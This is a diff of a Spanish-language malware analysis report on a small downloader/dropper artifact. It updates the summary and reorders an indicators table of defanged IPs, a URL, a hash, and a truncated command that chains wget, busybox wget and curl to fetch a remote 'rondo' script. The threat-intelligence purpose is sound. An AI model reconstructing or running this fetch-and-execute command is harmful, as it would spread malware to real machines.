@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with no line terminators de 151 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `rondo` en `hxxp://45.153.34.XXX/rondo`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:45:45+00:00`
+- **Registrado:** `2026-08-09T19:45:45.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -51,10 +52,10 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 45.153.34.XXX | static_analysis |
 | url | hxxp://45.153.34.XXX/rondo. | strings |
-| hash | af55268635bdc15c35db37f93da015432ba6e74873d81da83436901fb81f92f7 | static_analysis |
+| ip | 45.153.34.XXX | static_analysis |
 | command | (wget -qO- hxxp://45.153.34.XXX/rondo.``dgx.sh\|\|busybox wget -qO- hxxp://45.153.34.XXX/rondo.``dgx.sh\|\|curl -s hxxp://45 | strings |
+| hash | af55268635bdc15c35db37f93da015432ba6e74873d81da83436901fb81f92f7 | static_analysis |
 | ip | 94.154.43.XXX | artifact_source |
 
 ## 🛡️ Nota de publicación
